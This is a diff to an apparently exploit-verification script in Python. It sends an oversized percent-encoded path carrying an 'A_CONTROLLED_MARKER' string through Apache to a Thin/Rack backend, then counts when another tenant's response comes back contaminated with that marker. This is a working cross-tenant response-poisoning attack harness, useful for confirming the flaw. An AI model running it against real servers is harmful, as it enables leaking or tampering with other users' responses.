@@ -89,7 +89,7 @@ def main() -> int:
         try:
             wait_for_port(18181, thin, "Thin", thin_log)
 
-            path = "/missing/" + "%E2%98%83" * 80
+            path = "/missing/" + "%E2%98%83" * 80 + "A_CONTROLLED_MARKER"
             direct_request = (
                 f"GET {path} HTTP/1.1\r\nHost: tenant-a.example\r\n"
                 "Connection: keep-alive\r\n\r\n"
@@ -161,7 +161,13 @@ ProxyPassReverse / http://127.0.0.1:18181/
                     except (AssertionError, OSError, socket.timeout):
                         apache_errors += 1
                         continue
-                    if body_b != b"VICTIM-OWN":
+                    if os.environ.get("RACK_THIN_IMPACT") == "1":
+                        if b"A_CONTROLLED_MARKER" not in body_b:
+                            apache_errors += 1
+                            continue
+                        contaminated += 1
+                        print(f"rack_thin_impact_marker_iteration={i}")
+                    elif body_b != b"VICTIM-OWN":
                         contaminated += 1
                         print(f"rack_thin_contamination_iteration={i}")
                         print(f"rack_thin_victim_headers={headers_b!r}")
